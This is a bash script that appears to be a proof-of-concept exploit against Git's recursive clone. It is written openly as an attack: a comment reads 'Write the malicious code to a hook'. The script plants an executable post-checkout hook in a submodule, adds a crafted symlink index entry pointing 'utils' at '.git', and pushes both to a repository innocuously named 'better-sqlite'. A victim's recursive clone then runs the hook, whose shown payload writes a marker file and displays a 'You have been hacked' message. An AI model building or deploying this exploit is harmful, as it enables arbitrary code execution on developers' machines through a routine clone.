#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main 


# Define the repositories path
hook_repo="https://github.com/th4s1s/hook.git"
main_repo="https://github.com/th4s1s/better-sqlite.git"

# Initialize the hook repository
git clone "$hook_repo" hook
cd hook
mkdir -p fast/hooks

# Write the malicious code to a hook
cat > fast/hooks/post-checkout <<EOF
#!/bin/bash
echo "You have been hacked" > /tmp/hacked
powershell.exe -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You have been hacked', 'Warning', 'OK', 'Warning')"
EOF

# Make the hook executable
chmod +x fast/hooks/post-checkout

git add fast/hooks/post-checkout
git commit -m "Add post-checkout hook"
git push origin main

cd ..

# Add hook submodule to the main repository
git clone "$main_repo" main
cd main
git submodule add --name query/fast "$hook_repo" Utils/modules/query
git commit -m "Add query submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\tutils\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "Add utils"
rm -rf dotgit.txt dot-git.hash index.info
git push origin main
cd ..

# Clone the injected repository (optional)
git clone --recursive "$main_repo"
